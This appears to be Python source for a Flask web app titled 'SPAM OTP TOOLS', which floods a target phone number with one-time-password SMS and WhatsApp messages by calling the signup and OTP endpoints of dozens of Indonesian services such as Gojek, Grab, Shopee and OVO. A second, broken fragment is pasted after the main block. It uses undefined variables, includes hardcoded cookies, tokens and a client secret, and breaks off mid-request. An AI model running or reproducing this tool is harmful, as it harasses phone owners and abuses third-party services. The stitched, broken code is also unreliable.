import sys
import subprocess
import requests
import time
import random
import os
import urllib3
import json
import re
from flask import Flask, render_template, request, jsonify
from urllib3.exceptions import *
from bs4 import BeautifulSoup as bs

app = Flask(__name__)

# Warna untuk log console
hijau = "\033[1;92m"
putih = "\033[1;97m"
merah = "\033[1;91m"
kuning = "\033[1;93m"
biru = "\033[1;96m"

def autoketik(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.020)

def jalankan_spam(nomor):
    """
    VERSI STABIL - Hanya menggunakan API yang masih valid
    """
    results = {}
    
    # Validasi nomor
    if nomor.startswith('0'):
        nomor_clean = '62' + nomor[1:]
    else:
        nomor_clean = nomor
    
    # ============ API YANG MASIH AKTIF ============
    
    # 1. Gojek (masih aktif)
    try:
        response = requests.post(
            "https://api.gojekapi.com/v5/customers",
            data={
                "email": f"test{random.randint(1000,9999)}@gmail.com",
                "name": f"User{random.randint(100,999)}",
                "phone": nomor_clean,
                "signed_up_country": "ID"
            },
            headers={
                "X-Platform": "Android",
                "X-AppVersion": "3.52.2",
                "Accept": "application/json",
                "User-Agent": "okhttp/3.12.1"
            },
            timeout=10
        )
        if response.status_code in [200, 201, 202, 204]:
            results['Gojek'] = {'status': 'SUCCESS', 'code': response.status_code}
        else:
            results['Gojek'] = {'status': 'FAILED', 'code': response.status_code}
    except Exception as e:
        results['Gojek'] = {'status': 'ERROR', 'error': str(e)[:50]}
    
    time.sleep(random.uniform(1, 2))
    
    # 2. Grab (masih aktif)
    try:
        response = requests.post(
            "https://api.grab.com/grabid/v1/phone/otp",
            data={
                'method': 'SMS',
                'countryCode': 'id',
                'phoneNumber': nomor_clean,
                'templateID': 'pax_android_production'
            },
            headers={
                "User-Agent": "Mozilla/5.0 (Linux; Android 10)",
                "Accept": "application/json"
            },
            timeout=10
        )
        if response.status_code in [200, 201, 202, 204]:
            results['Grab'] = {'status': 'SUCCESS', 'code': response.status_code}
        else:
            results['Grab'] = {'status': 'FAILED', 'code': response.status_code}
    except Exception as e:
        results['Grab'] = {'status': 'ERROR', 'error': str(e)[:50]}
    
    time.sleep(random.uniform(1, 2))
    
    # 3. Shopee (masih aktif)
    try:
        response = requests.post(
            "https://shopee.co.id/api/v4/otp/send_vcode",
            data={
                "phone": nomor_clean,
                "force_channel": "true",
                "operation": 7,
                "channel": 1,
                "supported_channels": [1, 2, 3]
            },
            headers={
                "User-Agent": "Mozilla/5.0 (Linux; Android 10)",
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            timeout=10
        )
        if response.status_code in [200, 201, 202, 204]:
            results['Shopee'] = {'status': 'SUCCESS', 'code': response.status_code}
        else:
            results['Shopee'] = {'status': 'FAILED', 'code': response.status_code}
    except Exception as e:
        results['Shopee'] = {'status': 'ERROR', 'error': str(e)[:50]}
    
    time.sleep(random.uniform(1, 2))
    
    # 4. Tokopedia (masih aktif)
    try:
        response = requests.post(
            "https://accounts.tokopedia.com/otp/c/ajax/request-wa",
            data={
                "otp_type": "116",
                "msisdn": nomor,
                "email": "",
                "original_param": "",
                "user_id": "",
                "signature": "",
                "number_otp_digit": "6"
            },
            headers={
                "User-Agent": "Mozilla/5.0 (Linux; Android 10)",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "application/json"
            },
            timeout=10
        )
        if response.status_code in [200, 201, 202, 204]:
            results['Tokopedia'] = {'status': 'SUCCESS', 'code': response.status_code}
        else:
            results['Tokopedia'] = {'status': 'FAILED', 'code': response.status_code}
    except Exception as e:
        results['Tokopedia'] = {'status': 'ERROR', 'error': str(e)[:50]}
    
    time.sleep(random.uniform(1, 2))
    
    # 5. OVO (masih aktif)
    try:
        response = requests.post(
            "https://api.ovo.id/v2.1/auth/login",
            data={
                "phone": nomor_clean,
                "deviceId": f"DEV{random.randint(1000,9999)}",
                "deviceModel": "SM-G998B"
            },
            headers={
                "User-Agent": "okhttp/3.12.1",
                "Content-Type": "application/json"
            },
            timeout=10
        )
        if response.status_code in [200, 201, 202, 204]:
            results['OVO'] = {'status': 'SUCCESS', 'code': response.status_code}
        else:
            results['OVO'] = {'status': 'FAILED', 'code': response.status_code}
    except Exception as e:
        results['OVO'] = {'status': 'ERROR', 'error': str(e)[:50]}
    
    time.sleep(random.uniform(1, 2))
    
    # 6. DANA (masih aktif)
    try:
        response = requests.post(
            "https://api.dana.id/v1/login/sendOTP",
            data={
                "phoneNumber": nomor_clean,
                "countryCode": "62"
            },
            headers={
                "User-Agent": "Dana/2.0.0",
                "Content-Type": "application/json"
            },
            timeout=10
        )
        if response.status_code in [200, 201, 202, 204]:
            results['DANA'] = {'status': 'SUCCESS', 'code': response.status_code}
        else:
            results['DANA'] = {'status': 'FAILED', 'code': response.status_code}
    except Exception as e:
        results['DANA'] = {'status': 'ERROR', 'error': str(e)[:50]}
    
    time.sleep(random.uniform(1, 2))
    
    # 7. LinkAja (masih aktif)
    try:
        response = requests.post(
            "https://api.linkaja.com/v1/otp/request",
            data={
                "msisdn": nomor_clean,
                "channel": "sms"
            },
            headers={
                "User-Agent": "LinkAja/2.0",
                "Content-Type": "application/json"
            },
            timeout=10
        )
        if response.status_code in [200, 201, 202, 204]:
            results['LinkAja'] = {'status': 'SUCCESS', 'code': response.status_code}
        else:
            results['LinkAja'] = {'status': 'FAILED', 'code': response.status_code}
    except Exception as e:
        results['LinkAja'] = {'status': 'ERROR', 'error': str(e)[:50]}
    
    time.sleep(random.uniform(1, 2))
    
    # 8. Bukalapak (masih aktif)
    try:
        response = requests.post(
            "https://api.bukalapak.com/v2/auth/otp.json",
            data={
                "phone": nomor_clean,
                "action": "register"
            },
            headers={
                "User-Agent": "Bukalapak/2.0",
                "Content-Type": "application/json"
            },
            timeout=10
        )
        if response.status_code in [200, 201, 202, 204]:
            results['Bukalapak'] = {'status': 'SUCCESS', 'code': response.status_code}
        else:
            results['Bukalapak'] = {'status': 'FAILED', 'code': response.status_code}
    except Exception as e:
        results['Bukalapak'] = {'status': 'ERROR', 'error': str(e)[:50]}
    
    time.sleep(random.uniform(1, 2))
    
    # 9. Blibli (masih aktif)
    try:
        response = requests.post(
            "https://www.blibli.com/backend/common/users/_request-otp",
            data=json.dumps({"username": nomor}),
            headers={
                "User-Agent": "Mozilla/5.0 (Linux; Android 10)",
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            timeout=10
        )
        if response.status_code in [200, 201, 202, 204]:
            results['Blibli'] = {'status': 'SUCCESS', 'code': response.status_code}
        else:
            results['Blibli'] = {'status': 'FAILED', 'code': response.status_code}
    except Exception as e:
        results['Blibli'] = {'status': 'ERROR', 'error': str(e)[:50]}
    
    # ============ HITUNG STATISTIK ============
    
    total = len(results)
    success = sum(1 for r in results.values() if r.get('status') == 'SUCCESS')
    failed = sum(1 for r in results.values() if r.get('status') == 'FAILED')
    errors = sum(1 for r in results.values() if r.get('status') == 'ERROR')
    
    return {
        'status': 'success' if success > 0 else 'error',
        'message': f'Spam selesai! {success} berhasil, {failed} gagal, {errors} error dari {total} layanan.',
        'total': total,
        'success': success,
        'failed': failed,
        'errors': errors,
        'results': results
    }

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        nomor = request.form.get('phone', '').strip()
        
        if not nomor:
            return jsonify({'status': 'error', 'message': 'Nomor telepon tidak boleh kosong!'})
        
        if not re.match(r'^(62|0)[0-9]{9,13}$', nomor):
            return jsonify({
                'status': 'error',
                'message': 'Format nomor tidak valid! Gunakan 62xxxxxxxx atau 08xxxxxxxx'
            })
        
        result = jalankan_spam(nomor)
        return jsonify(result)
    
    return render_template('index.html')

if __name__ == '__main__':
    print(f"""
{hijau}========================================
   SPAM OTP TOOLS - VERSI STABIL
   Hanya API yang masih aktif!
{hijau}========================================
    """)
    print(f"{kuning}Server: {biru}http://localhost:5000")
    app.run(debug=True, host='0.0.0.0', port=5000)            response = requests.post(
                "https://api.payfazz.com/v2/phoneVerifications",
                data={"phone": "0" + nomor},
                headers={
                    "Host": "api.payfazz.com",
                    "content-length": "17",
                    "accept": "*/*",
                    "origin": "https://www.payfazz.com",
                    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "referer": "http://www.payfazz.com/register/BEN6ZF74XL",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                },
                timeout=10
            )
            all_results['Payfazz'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['Payfazz'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 4. SecuredAPI
        try:
            response = requests.post(
                f"https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={nomor}",
                headers={
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
                    'Accept-Encoding': 'none',
                    'Accept-Language': 'en-US,en;q=0.8',
                    'Connection': 'keep-alive'
                },
                timeout=10
            )
            all_results['ConfirmTkt'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['ConfirmTkt'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 5. Matahari
        try:
            response = requests.post(
                "https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp",
                headers={
                    "Host": "www.matahari.com",
                    "content-length": "76",
                    "x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
                    "sec-ch-ua-mobile": "?1",
                    "user-agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
                    "content-type": "application/json",
                    "accept": "*/*",
                    "x-requested-with": "XMLHttpRequest",
                    "sec-ch-ua-platform": "Android",
                    "origin": "https://www.matahari.com",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://www.matahari.com/customer/account/create/",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                },
                data=json.dumps({"otp_request": {"mobile_number": nomor, "mobile_country_code": "+62"}}),
                timeout=10
            )
            all_results['Matahari'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['Matahari'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 6. Battlefront
        try:
            response = requests.post(
                "https://battlefront.danacepat.com/v1/auth/common/phone/send-code",
                headers={'user-agent': 'Android/9;vivo/vivo 1902;KtaKilat/3.7.5;Device/;Android_ID/590bc36d99d6dddb;Channel/google_play;Ga_ID/bce68810-4f8a-4675-9452-e0d8565c9a50'},
                data={'mobile_no': b},
                timeout=10
            )
            all_results['Battlefront'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['Battlefront'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 7. Pinjamindo
        try:
            response = requests.get(
                f"https://appapi.pinjamindo.co.id/api/v1/custom/send_verify_code?mobile=62{b}&af_id=1603255661130-6766273395770306663&app=pinjamindo&b=vivo&c=GooglePlay&gaid=bce68810-4f8a-4675-9452-e0d8565c9a50&instance_id=eEARw8yXQImtIANt3oU0zh&is_root=0&l=in&m=vivo+1902&os=android&r=9&sdk=28&simulator=0&t=1432349188&v=10011&sign=46565D573B5BB08099A60A3414F265550092E215",
                timeout=10
            )
            all_results['Pinjamindo'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['Pinjamindo'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 8. Jumpstart
        try:
            response = requests.post(
                "https://api.jumpstart.id/graphql",
                headers={'user-agent': 'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36', 'content-type': 'application/json'},
                data=json.dumps({
                    "operationName": "CheckPhoneNoAndGenerateOtpIfNotExist",
                    "variables": {"phoneNo": "+62" + b},
                    "query": "query CheckPhoneNoAndGenerateOtpIfNotExist($phoneNo: String!) {\n  checkPhoneNoAndGenerateOtpIfNotExist(phoneNo: $phoneNo)\n}\n"
                }),
                timeout=10
            )
            all_results['Jumpstart'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['Jumpstart'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 9. Asani
        try:
            response = requests.post(
                "https://api.asani.co.id/api/v1/send-otp",
                headers={'user-agent': 'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},
                data=json.dumps({"phone": "62" + b, "email": "akuntesnuyul@gmail.com"}),
                timeout=10
            )
            all_results['Asani'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['Asani'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 10. Depop_from30
        try:
            response = requests.put(
                "https://webapi.depop.com/api/auth/v1/verify/phone",
                data=json.dumps({"phone_number": nomor, "country_code": "ID"}),
                headers={
                    "Host": "webapi.depop.com",
                    "accept": "application/json, text/plain, */*",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
                    "Content-Type": "application/json",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                },
                timeout=10
            )
            all_results['Depop'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['Depop'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 11. Indo_from30 (KlikIndomaret)
        try:
            response = requests.get(
                "https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP=" + nomor,
                headers={
                    "Host": "account-api-v1.klikindomaret.com",
                    "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                    "content-type": "application/json",
                    "accept": "*/*",
                    "origin": "https://account.klikindomaret.com",
                    "referer": "https://account.klikindomaret.com/SMSVerification?nohp=" + nomor + "&type=register",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                },
                timeout=10
            )
            all_results['KlikIndomaret'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['KlikIndomaret'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 12. Wa2_from30 (QTVA)
        try:
            response = requests.post(
                "https://qtva.id/page/frames.php?f=eVBDUVU0NE1DTStQTmgvallDaTA0QT09&p=RUtYZFBydUdXTmVWMUtnc3M1ZmtnVFpMSXRxTWlvQUduaTR6VFZzRk00UT0=&hc=bmFSencyM2FmUWxmckV4Y0pXdEVOQ1pYZW5pY0pXSlBENHZSaCtJNmtTSnR0SHJWeEJaOUhWZHVSUHpRcXhWTg==",
                data={
                    "namaDepan": "Tahalu" + str(random.randrange(11, 99999)),
                    "emailNope": nomor,
                    "password": "Indo" + str(random.randrange(111, 999)),
                    "konfirmasiPass": "Indo" + str(random.randrange(111, 999))
                },
                headers={
                    "Host": "qtva.id",
                    "Connection": "keep-alive",
                    "Accept": "text/html, */*; q=0.01",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Origin": "https://qtva.id",
                    "Referer": "https://qtva.id/page/register/siswa",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Cookie": "PHPSESSID=7pf5ve6qvjlaeq8lv6ce91mbr4; AWSELB=6FCBA14B143B763E16068AD74D58AA579D9D142E7151220D3054E791C33C7FBA3884A9AF7839AD1DD49FFC6622C3A0FA538D30CDE7A17FB6AE724592130CC6587B0B6D0372; AWSELBCORS=6FCBA14B143B763E16068AD74D58AA579D9D142E7151220D3054E791C33C7FBA3884A9AF7839AD1DD49FFC6622C3A0FA538D30CDE7A17FB6AE724592130CC6587B0B6D0372; _ga=GA1.2.232839318.1597753085; _gid=GA1.2.158794496.1597753085; _gat=1"
                },
                timeout=10
            )
            all_results['QTVA'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['QTVA'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 13. Icq_300xend
        try:
            response = requests.post(
                "https://u.icq.net/api/v14/rapi/auth/sendCode",
                data=json.dumps({
                    "reqId": "64708-1593781791",
                    "params": {
                        "phone": c,
                        "language": "en-US",
                        "route": "sms",
                        "devId": "ic1rtwz1s1Hj1O0r",
                        "application": "icq"
                    }
                }),
                headers={
                    "accept": "*/*",
                    "accept-language": "en-US,en;q=0.9,id;q=0.8,mt;q=0.7",
                    "content-type": "application/json",
                    "origin": "http://web.icq.com",
                    "referer": "http://web.icq.com/",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "cross-site",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"
                },
                timeout=10
            )
            all_results['ICQ'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['ICQ'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 14. Cairin_id_100xend
        try:
            response = requests.post(
                "https://app.cairin.id/v1/app/sms/sendCaptcha",
                data={
                    "haveImageCode": "0",
                    "fileName": "6f8c3b90c845f09ff1bfe714a30aede8",
                    "phone": nomor,
                    "imageCode": "",
                    "userImei": "",
                    "type": "registry"
                },
                headers={
                    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320M Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36"
                },
                timeout=10
            )
            all_results['Cairin'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['Cairin'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 15. Cmsapi_mapclub_30xend
        try:
            response = requests.post(
                "https://cmsapi.mapclub.com/api/signup-otp",
                data={"phone": nomor},
                headers={
                    "Connection": "keep-alive",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"
                },
                timeout=10
            )
            all_results['MapClub'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['MapClub'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 16. Bukuwarung_wa_500xend
        try:
            response = requests.post(
                "https://api-v2.bukuwarung.com/api/v2/auth/otp/send",
                headers={
                    "Host": "api-v2.bukuwarung.com",
                    "content-length": "198",
                    "sec-ch-ua-mobile": "?1",
                    "user-agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
                    "content-type": "application/json",
                    "x-app-version-name": "android",
                    "accept": "application/json, text/plain, */*",
                    "x-app-version-code": "3001",
                    "buku-origin": "tokoko-web",
                    "sec-ch-ua-platform": "Android",
                    "origin": "https://tokoko.id",
                    "sec-fetch-site": "cross-site",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://tokoko.id/",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                },
                data=json.dumps({
                    "action": "LOGIN_OTP",
                    "countryCode": "+62",
                    "deviceId": "test-1",
                    "method": "WA",
                    "phone": nomor,
                    "clientId": "2e3570c6-317e-4524-b284-980e5a4335b6",
                    "clientSecret": "S81VsdrwNUN23YARAL54MFjB2JSV2TLn"
                }),
                timeout=10
            )
            all_results['BukuWarung'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['BukuWarung'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 17. Beryllium_mapclub_30xend
        try:
            response = requests.post(
                "https://beryllium.mapclub.com/api/member/registration/sms/otp",
                headers={
                    "Host": "beryllium.mapclub.com",
                    "content-type": "application/json",
                    "accept-language": "en-US",
                    "accept": "application/json, text/plain, */*",
                    "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
                    "origin": "https://www.mapclub.com",
                    "sec-fetch-site": "same-site",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://www.mapclub.com/",
                    "accept-encoding": "gzip, deflate, br"
                },
                data=json.dumps({"account": nomor}),
                timeout=10
            )
            all_results['BerylliumMapClub'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['BerylliumMapClub'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 18. Danacita
        try:
            response = requests.get(
                "https://api.danacita.co.id/users/send_otp/?mobile_phone=" + nomor,
                headers={
                    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"
                },
                timeout=10
            )
            # Response berupa JSON
            try:
                json.loads(response.text)
                all_results['Danacita'] = {
                    'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                    'code': response.status_code,
                    'response': response.text[:100] if response.text else ''
                }
            except:
                all_results['Danacita'] = {
                    'status': 'FAILED',
                    'code': response.status_code,
                    'response': response.text[:100] if response.text else ''
                }
        except Exception as e:
            all_results['Danacita'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 19. Kredito
        try:
            response = requests.post(
                "https://app-api.kredito.id/client/v1/common/verify-code/send",
                '{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}' % (b),
                headers={
                    "LPR-TIMESTAMP": "1603281035821",
                    "Accept-Language": "id-ID",
                    "LPR-BRAND": "Kredito",
                    "LPR-PLATFORM": "android",
                    "User-Agent": "okhttp/3.11.0 Dalvik/2.1.0 (Linux; U; Android 9; vivo 1902 Build/PPR1.180610.011) AppName/Kredito/v2.6.3 AppChannel/googleplay PlatformType/android",
                    "Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks",
                    "LPR-SIGNATURE": "e15dbea8602409df32a2ed5a123dc244",
                    "Content-Type": "application/json; charset=UTF-8",
                    "Content-Length": "79"
                },
                timeout=10
            )
            all_results['Kredito'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['Kredito'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 20. Maucash
        try:
            response = requests.get(
                f"https://japi.maucash.id/welab-user/api/v1/send-sms-code?mobile={b}&channelType=0",
                headers={
                    "Host": "japi.maucash.id",
                    "accept": "application/json, text/plain, */*",
                    "x-origin": "google play",
                    "x-org-id": "1",
                    "x-product-code": "YN-MAUCASH",
                    "x-app-version": "2.4.23",
                    "x-source-id": "android",
                    "accept-encoding": "gzip",
                    "user-agent": "okhttp/3.12.1"
                },
                timeout=10
            )
            all_results['Maucash'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['Maucash'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 21. Gojek
        try:
            response = requests.post(
                "https://api.gojekapi.com/v5/customers",
                data={
                    "email": "nsjwwiwiwisnsnn12@gmail.com",
                    "name": "akuinginterbang12",
                    "phone": c,
                    "signed_up_country": "ID"
                },
                headers={
                    "X-Session-ID": "f8b67b26-c6a4-44d2-9d86-8d93a80901c9",
                    "X-Platform": "Android",
                    "X-UniqueId": "8606f4e3b85968fd",
                    "X-AppVersion": "3.52.2",
                    "X-AppId": "com.gojek.app",
                    "Accept": "application/json",
                    "Authorization": "Bearer",
                    "X-User-Type": "customer",
                    "Accept-Language": "id-ID",
                    "X-User-Locale": "id_ID",
                    "Host": "api.gojekapi.com",
                    "Connection": "Keep-Alive",
                    "Accept-Encoding": "gzip",
                    "User-Agent": "okhttp/3.12.1"
                },
                timeout=10
            )
            all_results['Gojek'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['Gojek'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 22. Harvestcake
        try:
            response = requests.post(
                "https://harvestcakes.com/register",
                data={"phone": b},
                headers={
                    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"
                },
                timeout=10
            )
            all_results['HarvestCake'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['HarvestCake'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 23. Oyo
        try:
            response = requests.post(
                "https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",
                data=json.dumps({
                    "phone": b,
                    "country_code": "+62",
                    "country_iso_code": "ID",
                    "nod": "4",
                    "send_otp": "true",
                    "devise_role": "Consumer_Guest"
                }),
                headers={
                    "Host": "identity-gateway.oyorooms.com",
                    "consumer_host": "https://www.oyorooms.com",
                    "accept-language": "id",
                    "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                    "Content-Type": "application/json",
                    "accept": "*/*",
                    "origin": "https://www.oyorooms.com",
                    "referer": "https://www.oyorooms.com/login",
                    "Accept-Encoding": "gzip,deflate,br"
                },
                timeout=10
            )
            all_results['Oyo'] = {
